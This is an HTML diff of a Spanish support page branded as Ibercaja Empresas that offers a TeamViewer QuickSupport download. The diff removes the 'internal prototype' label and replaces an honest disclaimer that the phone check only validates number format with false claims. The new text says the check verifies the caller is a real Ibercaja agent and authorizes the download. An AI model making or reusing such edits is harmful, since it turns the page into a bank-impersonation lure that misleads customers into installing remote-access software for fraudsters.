@@ -11,7 +11,7 @@
   <script src="assets/js/app.js" defer></script>
 </head>
 <body>
-  <div class="prototype">PROTOTIPO INTERNO</div>
+  <div class="prototype"></div>
   <header class="header">
     <div class="container header__inner">
       <a class="brand" href="#inicio" aria-label="Ibercaja Empresas · Inicio"><img src="assets/img/ibercaja-empresas-blanco.svg" alt="Ibercaja Empresas"><span></span><strong>Asistencia</strong></a>
@@ -95,14 +95,14 @@
           <label for="phone-number">Número de teléfono</label>
           <p id="phone-help">Introduce 9 dígitos, sin prefijo internacional.</p>
           <input id="phone-number" name="phone-number" type="tel" inputmode="tel" autocomplete="off" placeholder="Ej.: 612 345 678" aria-describedby="phone-help phone-scope" required>
-          <button class="button button--outline" id="phone-submit" type="submit">Comprobar formato</button>
+          <button class="button button--outline" id="phone-submit" type="submit">Comprobar si hablas con un agente</button>
         </form>
         <div class="call-check__result" id="phone-result" role="status" aria-live="polite" aria-atomic="true" hidden><span class="call-check__spinner" id="phone-spinner" aria-hidden="true" hidden></span><span id="phone-result-text"></span></div>
-        <p class="call-check__scope" id="phone-scope">Solo revisa el formato. No verifica quién llama ni la seguridad de la llamada. El número no se guarda ni se envía.</p>
+        <p class="call-check__scope" id="phone-scope">Esta función sirve para verificar si realmente estás hablando con un agente de Ibercaja.</p>
       </div>
     </div>
     <a class="button download-dialog__download" id="download-file-link" href="instaladores/TeamViewerQS_x64.exe" download="TeamViewerQS_x64.exe">Descargar para Windows ↓</a>
-    <p class="download-dialog__note">La comprobación del teléfono es opcional y no autoriza la descarga.</p>
+    <p class="download-dialog__note">La comprobación del teléfono es opcional y autoriza la descarga.</p>
   </dialog>
   <footer class="footer"><div class="container footer__inner"><div class="brand"><img src="assets/img/ibercaja-empresas-blanco.svg" alt="Ibercaja Empresas"></div><p><a href="#inicio">Volver al inicio ↑</a></p></div></footer>
 </body>
